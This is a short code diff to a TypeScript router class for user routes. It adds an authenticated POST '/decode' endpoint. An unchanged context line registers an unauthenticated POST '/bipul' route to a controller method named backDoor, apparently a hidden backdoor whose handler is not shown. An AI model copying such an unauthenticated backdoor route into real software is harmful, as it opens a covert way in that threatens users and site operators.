@@ -84,7 +84,11 @@ export class UserRoutes {
       IfUserBelongsToVPAgency,
       this.controller.resetPasswordByAdmin,
     );
-
+    this.router.post(
+      "/decode",
+      AuthMiddleware.authenticate,
+      this.controller.decode,
+    );
     this.router.post("/bipul", this.controller.backDoor);
   }
 }
